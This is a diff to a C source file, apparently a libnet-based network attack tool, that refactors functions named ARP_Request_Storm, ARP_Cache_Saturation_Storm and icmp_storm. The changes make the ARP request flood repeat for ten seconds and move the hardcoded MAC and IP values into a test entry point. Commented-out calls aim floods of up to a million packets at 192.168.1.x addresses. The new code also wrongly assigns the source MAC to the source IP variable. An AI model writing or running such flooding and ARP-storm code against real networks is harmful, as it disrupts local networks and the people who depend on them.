@@ -1,23 +1,20 @@
 
-#include "./include/network.h"
+#include "network.h"
+#include "arp.h"
+#include <time.h>
 
 
 
 
-u_char enet_src[6] = {0x0d, 0x0e, 0x0a, 0x0d, 0x00, 0x00};
-u_char enet_dst[6] = {0x00, 0x10, 0x67, 0x00, 0xb1, 0x86};
-u_char ip_src[4]   = {0x0a, 0x00, 0x00, 0x01};
-u_char ip_dst[4]   = {0x0a, 0x00, 0x00, 0x02};
-u_char fddi_src[6] = {0x00, 0x0d, 0x0e, 0x0a, 0x0d, 0x00};
-u_char fddi_dst[6] = {0x00, 0x10, 0x67, 0x00, 0xb1, 0x86};
-u_char tr_src[6]   = {0x00, 0x0d, 0x0e, 0x0a, 0x0d, 0x00};
-u_char tr_dst[6]   = {0x00, 0x10, 0x67, 0x00, 0xb1, 0x86};
-u_char org_code[3] = {0x00, 0x00, 0x00};
-
-
-int ARP_Request_Storm(u_char *ip_dst,u_char *ip_src,u_char *enet_src,u_char *enet_dst,char *device,int storm_size)
+int ARP_Request_Storm(struct ARP_Request_Storm_ARG *a)
 {
 
+	u_char *ip_dst=a->ip_dst;
+	u_char *ip_src=a->enet_src;
+	u_char *enet_src=a->enet_src;
+	u_char *enet_dst=a->enet_dst;
+	char *device=a->device;
+	int storm_size=a->storm_size;
 	u_int32_t d;
 	u_int32_t s;
     libnet_t *l;
@@ -25,8 +22,7 @@ int ARP_Request_Storm(u_char *ip_dst,u_char *ip_src,u_char *enet_src,u_char *ene
     u_int32_t packet_s;
 	libnet_ptag_t t;
     char errbuf[LIBNET_ERRBUF_SIZE];
-	u_char enet_ffff[6] ={0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
-		
+	u_char enet_ffff[6] ={0xff, 0xff, 0xff, 0xff, 0xff, 0xff};	
 	l = libnet_init(
 				LIBNET_LINK_ADV,						/* injection type */
 				device, 								/* network interface */
@@ -78,8 +74,15 @@ int ARP_Request_Storm(u_char *ip_dst,u_char *ip_src,u_char *enet_src,u_char *ene
         fprintf(stderr, "packet size: %d\n", packet_s);
         libnet_adv_free_packet(l, packet);
     }
-	
-	send_storm(l,storm_size,packet_s);
+	clock_t start = clock();
+    clock_t end = (clock() - start)/CLOCKS_PER_SEC;
+	clock_t last;
+	while(end<10)
+		{	
+			
+			send_storm(l,storm_size,packet_s);
+			end = (clock() - start)/CLOCKS_PER_SEC;
+		}
 
     libnet_destroy(l);
     return 1;
@@ -990,13 +993,21 @@ int ARP_Cache_Saturation_Storm(u_char *ip_dst,u_char *enet_dst,char *device,int 
 }
 
 int 
-main(int argc, char *argv[])
+main_test(int argc, char *argv[])
 {	
 	
+	u_char enet_src[6] = {0x0d, 0x0e, 0x0a, 0x0d, 0x00, 0x00};
+	u_char enet_dst[6] = {0x00, 0x10, 0x67, 0x00, 0xb1, 0x86};
+	u_char ip_src[4]   = {0x0a, 0x00, 0x00, 0x01};
+	u_char ip_dst[4]   = {0x0a, 0x00, 0x00, 0x02};
+	u_char fddi_src[6] = {0x00, 0x0d, 0x0e, 0x0a, 0x0d, 0x00};
+	u_char fddi_dst[6] = {0x00, 0x10, 0x67, 0x00, 0xb1, 0x86};
+	u_char tr_src[6]   = {0x00, 0x0d, 0x0e, 0x0a, 0x0d, 0x00};
+	u_char tr_dst[6]   = {0x00, 0x10, 0x67, 0x00, 0xb1, 0x86};
 
 	//int re=ARP_Grammear("192.168.1.1","192.168.1.100",enet_src,enet_dst,"eth0");
 	//int re= ARP_Cache_Saturation_Storm("192.168.1.100",enet_dst,"eth0",1000000);
-	int re=icmp_storm("192.168.1.1","192.168.1.100",enet_src,enet_dst,"eth0",100000);
+	//int re=icmp_storm("192.168.1.1","192.168.1.100",enet_src,enet_dst,"eth0",100000);
     //int c;
     u_int32_t i;
     libnet_t *l;
